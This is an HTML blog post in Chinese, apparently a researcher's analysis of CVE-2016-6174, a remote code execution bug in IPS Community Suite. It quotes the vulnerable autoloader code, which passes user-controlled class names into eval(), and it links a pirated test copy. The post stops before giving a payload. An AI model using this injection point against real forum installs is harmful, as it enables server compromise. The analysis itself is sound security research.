@@ -1,0 +1,526 @@
+<!DOCTYPE html>
+<html lang="default">
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+  
+  <title>CVE-2016-6174漏洞分析 | Hc1m1</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="IPS Community Suite Remote Code Execution Analysis">
+<meta name="keywords" content="安全研究">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CVE-2016-6174漏洞分析">
+<meta property="og:url" content="http://0x48.pw/2016/08/10/0x1F/index.html">
+<meta property="og:site_name" content="Hc1m1">
+<meta property="og:description" content="IPS Community Suite Remote Code Execution Analysis">
+<meta property="og:image" content="http://qn.lazysheep.cc/img/ips_pic1.png">
+<meta property="og:image" content="http://qn.lazysheep.cc/img/ips_pic2.png">
+<meta property="og:image" content="http://qn.lazysheep.cc/img/ips_pic3.png">
+<meta property="og:updated_time" content="2016-08-10T13:19:07.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CVE-2016-6174漏洞分析">
+<meta name="twitter:description" content="IPS Community Suite Remote Code Execution Analysis">
+<meta name="twitter:image" content="http://qn.lazysheep.cc/img/ips_pic1.png">
+  
+    <link rel="alternative" href="/rss.xml" title="Hc1m1" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  
+  
+      <link href="//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css" rel="stylesheet">
+  
+  
+      <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+      <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+    <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <script src="//cdn.bootcss.com/jquery/1.9.1/jquery.min.js"></script>
+  <script>
+      var yiliaConfig = {
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false,
+      }
+  </script>
+
+  
+      <script>
+          yiliaConfig.rootUrl = "/";
+      </script>
+  
+
+  
+      <script>
+          var _hmt = _hmt || [];
+          (function() {
+              var hm = document.createElement("script");
+              hm.src = "//hm.baidu.com/hm.js?4b6b8b9a09d24f4d4e26c50bd1707fd7";
+              var s = document.getElementsByTagName("script")[0]; 
+              s.parentNode.insertBefore(hm, s);
+          })();
+      </script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+  
+</head>
+<body>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="http://qn.lazysheep.cc/img/author.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Hcamael</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">Blog</p>
+        
+                
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <li id="Email"><a class="Email" target="_blank" href="mailto: baiyjrh@gmail.com" title="Email"></a></li>
+                            
+                                <li id="GitHub"><a class="GitHub" target="_blank" href="https://github.com/Hcamael" title="GitHub"></a></li>
+                            
+                                <li id="RSS"><a class="RSS" target="_blank" href="/rss.xml" title="RSS"></a></li>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/Binary/" style="font-size: 16px;">Binary</a> <a href="/tags/CBC-Padding-Oracle-Attack/" style="font-size: 10px;">CBC Padding Oracle Attack</a> <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Crypto/" style="font-size: 18px;">Crypto</a> <a href="/tags/GIT/" style="font-size: 10px;">GIT</a> <a href="/tags/Old博文/" style="font-size: 10px;">Old博文</a> <a href="/tags/PWN/" style="font-size: 14px;">PWN</a> <a href="/tags/Pentest/" style="font-size: 10px;">Pentest</a> <a href="/tags/Pwn/" style="font-size: 12px;">Pwn</a> <a href="/tags/Python/" style="font-size: 14px;">Python</a> <a href="/tags/RE/" style="font-size: 10px;">RE</a> <a href="/tags/Re/" style="font-size: 10px;">Re</a> <a href="/tags/SHA1-Length-Extension-Attack/" style="font-size: 10px;">SHA1 Length Extension Attack</a> <a href="/tags/SQLi/" style="font-size: 12px;">SQLi</a> <a href="/tags/Web/" style="font-size: 10px;">Web</a> <a href="/tags/Wechall/" style="font-size: 10px;">Wechall</a> <a href="/tags/php/" style="font-size: 14px;">php</a> <a href="/tags/安全研究/" style="font-size: 12px;">安全研究</a> <a href="/tags/密码学/" style="font-size: 10px;">密码学</a> <a href="/tags/检讨/" style="font-size: 10px;">检讨</a> <a href="/tags/环境搭建/" style="font-size: 10px;">环境搭建</a> <a href="/tags/网络/" style="font-size: 10px;">网络</a> <a href="/tags/随笔/" style="font-size: 10px;">随笔</a>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://hduisa.cn">HDUISA</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://wiki.hduisa.org">wiki</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://drops.hduisa.org">Drops</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://lightless.me">lightless</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://homeway.me">夏日小草</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.edwardl.xyz">Edward_L</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://aklis.info">Aklis</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://libc.pw">Explorer</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://lorexxar.cn">Lorexxar</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">HDUISA, web狗, 菜鸡H, 正在向bin爷爷努力前进</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Hcamael</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="http://qn.lazysheep.cc/img/author.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Hcamael</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">Blog</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <li id="Email"><a class="Email" target="_blank" href="mailto: baiyjrh@gmail.com" title="Email"></a></li>
+                            
+                                <li id="GitHub"><a class="GitHub" target="_blank" href="https://github.com/Hcamael" title="GitHub"></a></li>
+                            
+                                <li id="RSS"><a class="RSS" target="_blank" href="/rss.xml" title="RSS"></a></li>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-0x1F" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/08/10/0x1F/" class="article-date">
+      <time datetime="2016-08-10T13:02:51.000Z" itemprop="datePublished">2016-08-10</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      CVE-2016-6174漏洞分析
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/H-blog/">H-blog</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/安全研究/">安全研究</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>IPS Community Suite Remote Code Execution Analysis</p>
+<a id="more"></a>
+<p>花了三天时间去分析这漏洞, 两天搞环境, 半天分析漏洞, 半天写总结。</p>
+<p>然后研究了一个phpenv + lnmp的不同虚拟主机不同php版本, 写了一个一键新建相应php版本的虚拟主机脚本, 会在之后的文章中发出来。</p>
+<p>漏洞分析参考链接：<a href="http://blog.knownsec.com/2016/08/ips-community-suite-php-rce-cve-2016-6174/" target="_blank" rel="external">http://blog.knownsec.com/2016/08/ips-community-suite-php-rce-cve-2016-6174/</a><br>测试应用: <a href="http://115.159.191.193/source/IPS.Community.Suite.4.1.12.3_nulled.zip" target="_blank" rel="external">IPS.Community.Suite.4.1.12.3_nulled.zip</a></p>
+<p>对于IPS远程代码执行的漏洞, 我觉得是比较鸡肋的, 因为关键有一个PHP版本的限制:</p>
+<p><code>&lt;=5.4.24 &amp;&amp; 5.5.0-5.5.8</code></p>
+<p>在安装4.1.12.3版本的IPS时, 该CMS会检测服务器的PHP版本, 要求 <code>&gt;=5.5.0</code>, 建议<code>&gt;5.6.0</code></p>
+<p>所以说有效版本应该是 <code>5.5.0-5.5.8</code>, 小于等于<code>5.4.24</code>版本时, IPS根本无法安装</p>
+<p>我使用的测试版本: 5.5.0, 安装的时候会产生致命bug, 我花了一天去调bug, 也没能根本解决.</p>
+<p>在安装的最后一步, 应该是安装模块库之类的, 在每个安装步骤中定位到一句 <code>unset( \IPS\.*::i()-&gt;* ); //比如 unset( \IPS\Data\Store::i()-&gt;settings );</code></p>
+<p>如果你直接输出unset的内容 <code>var_dump( \IPS\Data\Store::i()-&gt;settings );exit;</code>, 你会发现CMS报错了, 但是是输出一系列数组, 并没有解释错误的具体原因, 而unset一个error的变量, 显然会爆炸, 导致502</p>
+<p>而该CMS安装的过程中一个步骤错误, 安装就会终止不会继续进行下去了, 而且会error的变量我并没有找到啥特征, 而且并不是所有这类的变量都会error, 所以没能在根本上解决问题, 不过我装IPS又不是为了使用, 只是为了用来研究漏洞, 所以把unset注释了, 可以从表面上解决该问题, 不过会出错的地方太多了, 我只能批量注释了：</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ grep "unset(.*::i()-&gt;" ./* -rl | xargs sed -i "s/unset( <span class="symbol">\\</span><span class="symbol">\\</span>IPS/<span class="symbol">\/</span><span class="symbol">\/</span>unset( <span class="symbol">\\</span><span class="symbol">\\</span>IPS/g"</div></pre></td></tr></table></figure>
+<p>之后我使用php7.0安装IPS, 一下就好了, 没有出现任何问题, 所以我猜测该bug的原因应该是使用了一些不向下兼容的函数或新函数之类</p>
+<p>虽然最终我成功安装好了, 但是过程是艰辛的, 从ZoomEye上搜<code>IPS Community Suite</code>, 只搜出30+的结果, 然后再加上php的版本限制, 如果php版本在这范围内, 有耐心解决bug安装成功的, 然后还不懂安全, 能有多少？所以我觉得这是一个比较鸡肋的漏洞</p>
+<hr>
+<p>现在开始分析该漏洞</p>
+<p>该漏洞关键点是利用了class_exists函数的机制，来举例说明一下，对比的环境是<code>php5.5.0 &amp;&amp; php7.0.0</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span></span></div><div class="line">&#123;</div><div class="line">	<span class="function"><span class="keyword">function</span> <span class="title">Bar</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"a"</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">autoLoadClass</span><span class="params">($name)</span> </span>&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'spl_autoload_register: '</span>, $name, <span class="string">'&lt;br&gt;'</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">autoLoadClass2</span><span class="params">($name)</span> </span>&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'spl_autoload_register2: '</span>, $name, <span class="string">'&lt;br&gt;'</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">spl_autoload_register(<span class="string">'autoLoadClass'</span>);</div><div class="line">spl_autoload_register(<span class="string">'autoLoadClass2'</span>);</div><div class="line"></div><div class="line">class_exists(<span class="string">"Foo"</span>);</div><div class="line">class_exists(<span class="string">"Bar"</span>);</div><div class="line">class_exists(<span class="string">"Foo\Bar"</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>上面的代码说明的是<code>class_exists</code>函数的机制，两个版本的运行结果都一样</p>
+<p><img src="http://qn.lazysheep.cc/img/ips_pic1.png" alt="ips_pic1"></p>
+<p><code>class_exists</code>函数的作用是判断类是否存在，如果不存在，会去执行通过<code>spl_autoload_register</code>函数注册的函数，如果存在则返回true</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span></span></div><div class="line">&#123;</div><div class="line">	<span class="function"><span class="keyword">function</span> <span class="title">Bar</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"a"</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">autoLoadClass</span><span class="params">($name)</span> </span>&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'spl_autoload_register: '</span>, $name, <span class="string">'&lt;br&gt;'</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">spl_autoload_register(<span class="string">'autoLoadClass'</span>);</div><div class="line"></div><div class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; <span class="number">256</span> ; $i++) &#123;</div><div class="line">	$class_base = <span class="string">"Foo"</span>;</div><div class="line">	$class = $class_base.chr($i);</div><div class="line">	var_dump(class_exists($class));</div><div class="line">	<span class="keyword">echo</span> <span class="string">"       =====&gt;   "</span>.chr($i).<span class="string">"&lt;br&gt;"</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>上面的代码是为了说明<code>php5.5.0</code> 与 <code>php7.0.0</code>在class_exists函数上的不同点</p>
+<p>结果太长了不好截图, 自己跑跑就知道了, <code>php7.0.0</code>对于class_exists函数输入的classname有进行一系列的过滤, 如果classname中出现了非法字符则直接返回false, 而<code>php5.5.0</code>却不会进行任何字符检测，只是要未定义的类名皆会运行<code>spl_autoload_register</code>注册的函数</p>
+<p>再来看看IPS的代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">_content</span> <span class="keyword">extends</span> \<span class="title">IPS</span>\<span class="title">Dispatcher</span>\<span class="title">Controller</span></span></div><div class="line">&#123;</div><div class="line">	<span class="comment">/**</span></div><div class="line">	 * Find content</div><div class="line">	 *</div><div class="line">	 * <span class="doctag">@return</span>	void</div><div class="line">	 */</div><div class="line">	<span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">find</span><span class="params">()</span></span></div><div class="line">	&#123;</div><div class="line">		<span class="keyword">if</span> ( ! \IPS\Request::i()-&gt;content_class <span class="keyword">AND</span> ! \IPS\Request::i()-&gt;content_id <span class="keyword">AND</span> ! \IPS\Request::i()-&gt;content_commentid )</div><div class="line">		&#123;</div><div class="line">			\IPS\Output::i()-&gt;error( <span class="string">'node_error'</span>, <span class="string">'2S226/1'</span>, <span class="number">404</span>, <span class="string">''</span> );</div><div class="line">		&#125;</div><div class="line">		</div><div class="line">		$class = <span class="string">'IPS\\'</span> . implode( <span class="string">'\\'</span>, explode( <span class="string">'_'</span>, \IPS\Request::i()-&gt;content_class ) );</div><div class="line"></div><div class="line">		<span class="keyword">if</span> ( ! class_exists( $class ) <span class="keyword">or</span> ! in_array( <span class="string">'IPS\Content'</span>, class_parents( $class ) ) )</div><div class="line">		&#123;</div><div class="line">			\IPS\Output::i()-&gt;error( <span class="string">'node_error'</span>, <span class="string">'2S226/2'</span>, <span class="number">404</span>, <span class="string">''</span> );</div><div class="line">		&#125;</div></pre></td></tr></table></figure></p>
+<p>这里的<code>class_exists</code>函数判断<code>$class</code>是否存在, 而<code>$class = &quot;IPS\&quot; + &quot;可控&quot;</code>, 所以如果我们构造一个不存在的类则会进入<code>spl_autoload_register</code>注册的函数之中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div></pre></td><td class="code"><pre><div class="line">spl_autoload_register( <span class="function"><span class="keyword">function</span><span class="params">( $class )</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">if</span> ( mb_substr( $class, <span class="number">0</span>, <span class="number">15</span> ) === <span class="string">'IPS\cms\Records'</span> <span class="keyword">and</span> is_numeric( mb_substr( $class, <span class="number">15</span>, <span class="number">1</span> ) ) )</div><div class="line">	&#123;</div><div class="line">		......</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	<span class="keyword">if</span> ( mb_substr( $class, <span class="number">0</span>, <span class="number">23</span> ) === <span class="string">'IPS\cms\Records\Comment'</span> <span class="keyword">and</span> is_numeric( mb_substr( $class, <span class="number">23</span>, <span class="number">1</span> ) ) )</div><div class="line">	&#123;</div><div class="line">		$databaseId = mb_substr( $class, <span class="number">23</span> );</div><div class="line">	</div><div class="line">		$data = <span class="string">&lt;&lt;&lt;EOF</span></div><div class="line">		namespace IPS\cms\Records;</div><div class="line">		class Comment<span class="subst">&#123;$databaseId&#125;</span> extends Comment</div><div class="line">		&#123; </div><div class="line">			protected static \$multitons = array();</div><div class="line">			public static \$customDatabaseId = <span class="subst">$databaseId</span>;</div><div class="line">			public static \$itemClass = 'IPS\cms\Records<span class="subst">&#123;$databaseId&#125;</span>';</div><div class="line">			public static \$title     = 'content_record_comments_title_<span class="subst">&#123;$databaseId&#125;</span>';</div><div class="line">			public static \$reputationType = 'comment_id_<span class="subst">&#123;$databaseId&#125;</span>';</div><div class="line">		&#125;</div><div class="line">EOF;</div><div class="line">		<span class="keyword">eval</span>( $data );</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">if</span> ( mb_substr( $class, <span class="number">0</span>, <span class="number">22</span> ) === <span class="string">'IPS\cms\Records\Review'</span> <span class="keyword">and</span> is_numeric( mb_substr( $class, <span class="number">22</span>, <span class="number">1</span> ) ) )</div><div class="line">	&#123;</div><div class="line">		$databaseId = mb_substr( $class, <span class="number">22</span> );</div><div class="line"></div><div class="line">		$data = <span class="string">&lt;&lt;&lt;EOF</span></div><div class="line">		namespace IPS\cms\Records;</div><div class="line">		class Review<span class="subst">&#123;$databaseId&#125;</span> extends Review</div><div class="line">		&#123;</div><div class="line">			protected static \$multitons = array();</div><div class="line">			public static \$customDatabaseId = <span class="subst">$databaseId</span>;</div><div class="line">			public static \$itemClass = 'IPS\cms\Records<span class="subst">&#123;$databaseId&#125;</span>';</div><div class="line">			public static \$title     = 'content_record_reviews_title_<span class="subst">&#123;$databaseId&#125;</span>';</div><div class="line">		&#125;</div><div class="line">EOF;</div><div class="line">		<span class="keyword">eval</span>( $data );</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	<span class="keyword">if</span> ( mb_substr( $class, <span class="number">0</span>, <span class="number">18</span> ) === <span class="string">'IPS\cms\Categories'</span> <span class="keyword">and</span> is_numeric( mb_substr( $class, <span class="number">18</span>, <span class="number">1</span> ) ) )</div><div class="line">	&#123;</div><div class="line">		$databaseId = mb_substr( $class, <span class="number">18</span> );</div><div class="line">	</div><div class="line">		$data = <span class="string">&lt;&lt;&lt;EOF</span></div><div class="line">		namespace IPS\cms;</div><div class="line">		class Categories<span class="subst">&#123;$databaseId&#125;</span> extends Categories</div><div class="line">		&#123; </div><div class="line">			protected static \$multitons = array();</div><div class="line">			public static \$customDatabaseId = <span class="subst">$databaseId</span>;</div><div class="line">			public static \$contentItemClass = 'IPS\cms\Records<span class="subst">&#123;$databaseId&#125;</span>';</div><div class="line">			protected static \$containerIds = NULL;</div><div class="line">		&#125;</div><div class="line">EOF;</div><div class="line"></div><div class="line">		<span class="keyword">eval</span>( $data );</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	<span class="keyword">if</span> ( mb_substr( $class, <span class="number">0</span>, <span class="number">32</span> ) === <span class="string">'IPS\cms\Records\RecordsTopicSync'</span> )</div><div class="line">	&#123;</div><div class="line">		$databaseId = mb_substr( $class, <span class="number">32</span> );</div><div class="line">	</div><div class="line">		$data = <span class="string">&lt;&lt;&lt;EOF</span></div><div class="line">		namespace IPS\cms\Records;</div><div class="line">		class RecordsTopicSync<span class="subst">&#123;$databaseId&#125;</span> extends \IPS\cms\Records<span class="subst">&#123;$databaseId&#125;</span></div><div class="line">		&#123; </div><div class="line">			protected static \$multitons = array();</div><div class="line">			public static \$customDatabaseId = <span class="subst">$databaseId</span>;</div><div class="line">			public static \$databaseTable = 'cms_custom_database_<span class="subst">&#123;$databaseId&#125;</span>';</div><div class="line">			public static \$databaseColumnId = 'record_topicid';</div><div class="line">			public static \$commentClass = 'IPS\cms\Records\CommentTopicSync<span class="subst">&#123;$databaseId&#125;</span>';</div><div class="line"></div><div class="line">			public function useForumComments()</div><div class="line">			&#123;</div><div class="line">				return false;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">EOF;</div><div class="line">		<span class="keyword">eval</span>( $data );</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">if</span> ( mb_substr( $class, <span class="number">0</span>, <span class="number">32</span> ) === <span class="string">'IPS\cms\Records\CommentTopicSync'</span> )</div><div class="line">	&#123;</div><div class="line">		$databaseId = mb_substr( $class, <span class="number">32</span> );</div><div class="line"></div><div class="line">		$data = <span class="string">&lt;&lt;&lt;EOF</span></div><div class="line">		namespace IPS\cms\Records;</div><div class="line">		class CommentTopicSync<span class="subst">&#123;$databaseId&#125;</span> extends CommentTopicSync</div><div class="line">		&#123; </div><div class="line">			protected static \$multitons = array();</div><div class="line">			public static \$customDatabaseId = <span class="subst">$databaseId</span>;</div><div class="line">			public static \$itemClass = 'IPS\cms\Records\RecordsTopicSync<span class="subst">&#123;$databaseId&#125;</span>';</div><div class="line">			public static \$title     = 'content_record_comments_title_<span class="subst">&#123;$databaseId&#125;</span>';</div><div class="line">		&#125;</div><div class="line">EOF;</div><div class="line">		<span class="keyword">eval</span>( $data );</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">if</span> ( mb_substr( $class, <span class="number">0</span>, <span class="number">14</span> ) === <span class="string">'IPS\cms\Fields'</span> <span class="keyword">and</span> is_numeric( mb_substr( $class, <span class="number">14</span>, <span class="number">1</span> ) ) )</div><div class="line">	&#123;</div><div class="line">		$databaseId = mb_substr( $class, <span class="number">14</span> );</div><div class="line">		<span class="keyword">eval</span>( <span class="string">"namespace IPS\\cms; class Fields&#123;$databaseId&#125; extends Fields &#123; public static \$customDatabaseId = $databaseId; &#125;"</span> );</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">if</span> ( mb_substr( $class, <span class="number">0</span>, <span class="number">47</span> ) === <span class="string">'IPS\cms\extensions\core\EditorLocations\Records'</span> <span class="keyword">and</span> is_numeric( mb_substr( $class, <span class="number">47</span>, <span class="number">1</span> ) ) )</div><div class="line">	&#123;</div><div class="line">		$databaseId = mb_substr( $class, <span class="number">47</span> );</div><div class="line">		<span class="keyword">eval</span>( <span class="string">"namespace IPS\\cms\\extensions\\core\\EditorLocations; class Records&#123;$databaseId&#125; extends \\IPS\\cms\\extensions\\core\\EditorLocations\\Records &#123; public static \$customDatabaseId = $databaseId; &#125;"</span> );</div><div class="line">	&#125;</div><div class="line">&#125; );</div></pre></td></tr></table></figure>
+<p>除了第一个判断，其他所有判断我们都可以进入造成命令执行漏洞(所以第一个判断的代码我省略了), 比如第二判断</p>
